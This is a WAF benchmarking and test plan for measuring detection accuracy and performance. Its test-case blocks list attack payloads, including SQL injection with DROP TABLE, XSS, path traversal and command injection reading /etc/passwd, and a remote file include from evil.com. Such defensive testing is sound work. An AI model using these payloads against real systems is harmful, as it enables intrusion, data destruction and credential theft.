# WAF Benchmark Plan

This document outlines the plan for benchmarking and testing the WAF against various attack vectors and tools.

## Objectives

1. Measure detection accuracy (true positives, false negatives)
2. Measure false positive rate
3. Evaluate performance under load
4. Test against known attack tools (SQLMap, XSS payloads, etc.)
5. Prepare for OWASP WAF Benchmark compliance

## Test Categories

### 1. SQL Injection (SQLi)

#### Test Tools
- **SQLMap**: Automated SQL injection tool
- **Manual payloads**: Common SQL injection patterns

#### Test Cases
```
- Basic SQLi: 1' OR '1'='1
- UNION-based: 1' UNION SELECT NULL--
- Boolean-based: 1' AND 1=1--
- Time-based: 1'; WAITFOR DELAY '00:00:05'--
- Stacked queries: 1'; DROP TABLE users--
- Comment variations: --, #, /* */
- Encoding variations: %27, %2D%2D, %23
```

#### Expected Results
- All SQLi patterns should be detected
- Anomaly score >= threshold (blocked)
- Appropriate rule IDs in logs

#### Metrics
- Detection rate: % of SQLi payloads detected
- False positive rate: % of legitimate queries blocked
- Performance impact: Request latency increase

### 2. Cross-Site Scripting (XSS)

#### Test Tools
- **XSStrike**: XSS detection and exploitation tool
- **Manual payloads**: OWASP XSS Filter Evasion Cheat Sheet

#### Test Cases
```
- Basic: <script>alert('XSS')</script>
- Event handlers: <img src=x onerror=alert('XSS')>
- JavaScript protocol: javascript:alert('XSS')
- Encoded: %3Cscript%3Ealert('XSS')%3C/script%3E
- SVG: <svg onload=alert('XSS')>
- Iframe: <iframe src="javascript:alert('XSS')">
- Polyglot: <script>/*'/*`/*--></script>
```

#### Expected Results
- All XSS patterns detected
- Blocked with appropriate rule IDs
- No false positives on legitimate HTML content (if applicable)

#### Metrics
- Detection rate: % of XSS payloads detected
- False positive rate: % of legitimate content blocked
- Encoding detection: % of encoded payloads detected

### 3. Path Traversal / Local File Inclusion (LFI)

#### Test Cases
```
- Basic: ../../../etc/passwd
- Encoded: ..%2F..%2F..%2Fetc%2Fpasswd
- Double encoding: %252e%252e%252f
- Windows: ..\..\..\windows\system32\config\sam
- Null byte: ../../../etc/passwd%00
- UNC paths: \\..\\..\\..\\windows\\system32
```

#### Expected Results
- All path traversal patterns detected
- Blocked regardless of encoding
- No false positives on legitimate paths

#### Metrics
- Detection rate: % of path traversal attempts detected
- Encoding coverage: % of encoded variants detected

### 4. Command Injection

#### Test Cases
```
- Basic: ; ls
- Pipe: | cat /etc/passwd
- Backtick: `id`
- Command substitution: $(whoami)
- AND: && cat /etc/passwd
- OR: || cat /etc/passwd
- Semicolon: ; cat /etc/passwd
```

#### Expected Results
- Command injection patterns detected
- Blocked with appropriate severity

#### Metrics
- Detection rate: % of command injection attempts detected
- Operator coverage: Detection of all operators (;, |, &, `, $())

### 5. File Inclusion (RFI/LFI)

#### Test Cases
```
- LFI: /etc/passwd, /boot.ini, /win.ini
- RFI: http://evil.com/shell.php
- PHP wrappers: php://filter/read=string.rot13/resource=/etc/passwd
- Data URI: data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
```

#### Expected Results
- File inclusion patterns detected
- Both local and remote inclusion detected

#### Metrics
- Detection rate: % of file inclusion attempts detected
- LFI vs RFI detection: Separate metrics

### 6. HTTP Header Injection

#### Test Cases
```
- CRLF injection: %0d%0aSet-Cookie: malicious
- Response splitting: \r\n\r\nHTTP/1.1 200 OK
- Header injection: %0aX-Injected: value
```

#### Expected Results
- Header injection patterns detected
- CRLF sequences blocked

#### Metrics
- Detection rate: % of header injection attempts detected

## Performance Testing

### Load Testing

#### Tools
- **Apache Bench (ab)**: Basic load testing
- **wrk**: High-performance HTTP benchmarking
- **k6**: Modern load testing tool

#### Test Scenarios
1. **Baseline**: Legitimate requests only
2. **Mixed**: 90% legitimate, 10% malicious
3. **Attack**: 100% malicious requests
4. **Sustained**: Long-running test (1 hour+)

#### Metrics
- Requests per second (RPS)
- Latency (p50, p95, p99)
- CPU usage
- Memory usage
- Error rate

#### Targets
- 1000+ RPS for legitimate traffic
- < 10ms additional latency (p95)
- < 100MB memory overhead
- < 5% CPU overhead

### Stress Testing

#### Scenarios
- Large request bodies (10MB+)
- Many query parameters (100+)
- Long URLs (8KB+)
- Many concurrent connections (1000+)

#### Metrics
- Maximum sustainable load
- Failure points
- Resource exhaustion patterns

## OWASP WAF Benchmark

### Overview
The OWASP WAF Benchmark is a test suite designed to evaluate the accuracy of WAF products.

### Test Suite Structure
- **Positive Tests**: Legitimate requests that should be allowed
- **Negative Tests**: Attack requests that should be blocked

### Categories
1. SQL Injection
2. Cross-Site Scripting
3. Path Traversal
4. Command Injection
5. LDAP Injection
6. XPATH Injection
7. SSI Injection
8. XPath Injection

### Scoring
- **True Positive (TP)**: Attack correctly blocked
- **True Negative (TN)**: Legitimate request correctly allowed
- **False Positive (FP)**: Legitimate request incorrectly blocked
- **False Negative (FN)**: Attack incorrectly allowed

### Metrics
- **Accuracy**: (TP + TN) / (TP + TN + FP + FN)
- **Precision**: TP / (TP + FP)
- **Recall**: TP / (TP + FN)
- **F1 Score**: 2 * (Precision * Recall) / (Precision + Recall)

### Target Scores
- Accuracy: > 95%
- Precision: > 90%
- Recall: > 90%
- F1 Score: > 90%

## Fuzz Testing

### Tools
- **go-fuzz**: Go fuzzing tool
- **AFL**: American Fuzzy Lop
- **Custom fuzzers**: Domain-specific fuzzers

### Targets
1. **Rule Engine**: Fuzz rule matching logic
2. **Normalization**: Fuzz URL/path normalization
3. **Parser**: Fuzz HTTP request parsing
4. **Configuration**: Fuzz configuration loading

### Test Cases
- Random byte sequences
- Unicode variations
- Encoding variations
- Boundary conditions
- Malformed requests

## Implementation Plan

### Phase 1: Basic Testing (Current)
- [x] Integration tests for basic attacks
- [x] SQL injection detection
- [x] XSS detection
- [x] Path traversal detection

### Phase 2: Extended Testing
- [ ] SQLMap integration tests
- [ ] XSStrike integration tests
- [ ] Performance benchmarking
- [ ] Load testing

### Phase 3: OWASP Benchmark
- [ ] OWASP WAF Benchmark test suite integration
- [ ] Automated scoring
- [ ] Continuous benchmarking
- [ ] Score reporting

### Phase 4: Advanced Testing
- [ ] Fuzz testing implementation
- [ ] Evasion technique testing
- [ ] Performance regression testing
- [ ] Security regression testing

## Test Infrastructure

### Test Environment
- Isolated test network
- Mock upstream servers
- Test data sets
- Automated test runners

### Continuous Integration
- Automated test execution on commits
- Performance regression detection
- Security regression detection
- Test result reporting

### Test Data Management
- Curated attack payloads
- Legitimate request samples
- Performance test scenarios
- Benchmark datasets

## Reporting

### Test Reports
- Detection accuracy by category
- Performance metrics
- False positive/negative analysis
- Rule effectiveness analysis

### Dashboards
- Real-time test results
- Historical trends
- Performance metrics
- Security metrics

## Future Enhancements

1. **Machine Learning Testing**: Test ML-based detection
2. **Behavioral Analysis**: Test behavioral anomaly detection
3. **API Security**: Test API-specific attacks
4. **Zero-Day Simulation**: Test against unknown attack patterns
5. **Distributed Testing**: Test distributed WAF deployment

